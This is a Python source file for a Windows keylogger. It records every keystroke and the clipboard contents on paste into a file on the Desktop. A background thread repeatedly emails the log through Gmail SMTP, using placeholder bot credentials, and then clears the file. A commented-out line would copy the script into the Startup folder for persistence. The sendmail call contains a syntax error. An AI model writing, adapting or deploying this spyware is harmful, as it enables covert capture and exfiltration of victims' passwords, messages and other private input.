import smtplib as smtp
import multiprocessing
import smtplib as smtp
from email import encoders
import threading
import pyperclip
from urllib import request
import time
from shutil import copyfile
from pynput.keyboard._win32 import KeyCode
from pynput.keyboard import Listener
import os, logging
# from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart


def fun():
    while True:
        time.sleep(1)
        connected = False
        while not connected:
            try:
                request.urlopen('https://www.google.co.in/')
                connected = True
            except:
                connected = False
        msg = MIMEMultipart()
        msg['From'] = 'mybot'
        msg['To'] = "reciver's mail "
        msg['Subject'] = 'key'
        file = f"{logging_dir}/KeyLoger.txt"
        attachment = open(file, 'rb')
        p = MIMEBase('application', 'octet_stream')
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f'attachment; filename{file}')
        msg.attach(p)
        open(file, "w").close()
        print('done')

        text = msg.as_string()
        srever = smtp.SMTP("smtp.gmail.com", 587)

        srever.starttls()
        srever.login('bot mail_id',"bot mail_id's password")
        srever.sendmail('bot mail_id',"reciver's mail" )
                        text)
        srever.quit()




th = threading.Thread(target=fun)
th.start()
username = os.getlogin()
logging_dir = f"C:/Users/{username}/Desktop"
# copyfile('test.py',f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test.py')
logging.basicConfig(filename=f"{logging_dir}/KeyLoger.txt", level=logging.DEBUG, format="%(asctime)s:%(message)s")


def key_handeler(key):
    kkey=str(key)[2:5]

    if str(key)== 'Key.ctrl_l' or str(key)=='Key.caps_lock' or str(key)=='Key.tab' or str(key)=='Key.shift'\
            or str(key)=='Key.ctrl_l' or str(key)=='Key.alt_l' or str(key)=='Key.alt_gr' or str(key)=='Key.ctrl_r' \
            or str(key) == 'Key.shift_r' or str(key) == 'Key.home' or str(key) == 'Key.page_up' \
            or str(key) == 'Key.page_down' or str(key) == 'Key.end' :
        return
    elif str(kkey) == 'x16':
        key=f"'{pyperclip.paste().strip()}'was pasted"
    elif str(key)== 'Key.up' or str(key) == 'Key.down' or str(key) == 'Key.left' or str(key) == 'Key.right':
        key=f'{str(key)[4: ]} arrow'
    logging.info(key)
    print(key)


with Listener(on_press=key_handeler) as listener:
    listener.join()


print(dir(KeyCode))
